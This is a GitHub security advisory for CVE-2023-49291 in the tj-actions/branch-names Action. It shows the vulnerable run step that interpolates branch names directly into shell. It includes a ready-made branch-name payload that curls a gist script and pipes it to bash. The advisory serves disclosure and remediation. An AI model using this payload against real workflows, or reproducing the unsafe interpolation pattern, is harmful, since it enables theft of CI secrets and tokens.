# [C] tj-actions/branch-names's Improper Sanitization of Branch Name Leads to Arbitrary Code Injection

## Summary
Severity: Critical
Advisory: GHSA-8v8w-v8xg-79rf
CVE: CVE-2023-49291
CWE: CWE-20
Ecosystem: GitHub Actions
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2023-12-05
Source: https://github.com/advisories/GHSA-8v8w-v8xg-79rf
Type: github-advisory

## Affected
- GitHub Actions: `tj-actions/branch-names` — affected >=0 <7.0.7

## Details
### Summary

The `tj-actions/branch-names` GitHub Actions references the `github.event.pull_request.head.ref` and `github.head_ref` context variables within a GitHub Actions `run` step. The head ref variable is the branch name and can be used to execute arbitrary code using a specially crafted branch name.

### Details 

The vulnerable code is within the `action.yml` file the `run` step references the value directly, instead of a sanitized variable.

```yml
runs:
  using: "composite"
  steps:
    - id: branch
      run: |
        # "Set branch names..."
        if [[ "${{ github.ref }}" != "refs/tags/"* ]]; then
          BASE_REF=$(printf "%q" "${{ github.event.pull_request.base.ref || github.base_ref }}")
          HEAD_REF=$(printf "%q" "${{ github.event.pull_request.head.ref || github.head_ref }}")
          REF=$(printf "%q" "${{ github.ref }}")
```

An attacker can use a branch name to inject arbitrary code, for example: `Test")${IFS}&&${IFS}{curl,-sSfL,gist.githubusercontent.com/RampagingSloth/72511291630c7f95f0d8ffabb3c80fbf/raw/inject.sh}${IFS}|${IFS}bash&&echo${IFS}$("foo` will download and run a script from a Gist. This allows an attacker to inject a payload of arbitrary complexity.

### Impact
An attacker can use this vulnerability to steal secrets from or abuse `GITHUB_TOKEN` permissions.

### Reference
- https://securitylab.github.com/research/github-actions-untrusted-input

## References
- https://github.com/tj-actions/branch-names/security/advisories/GHSA-8v8w-v8xg-79rf
- https://nvd.nist.gov/vuln/detail/CVE-2023-49291
- https://github.com/tj-actions/branch-names/commit/4923d1ca41f928c24f1c1b3af9daaadfb71e6337
- https://github.com/tj-actions/branch-names/commit/6c999acf206f5561e19f46301bb310e9e70d8815
- https://github.com/tj-actions/branch-names/commit/726fe9ba5e9da4fcc716223b7994ffd0358af060
- https://github.com/tj-actions/branch-names
- https://securitylab.github.com/research/github-actions-untrusted-input
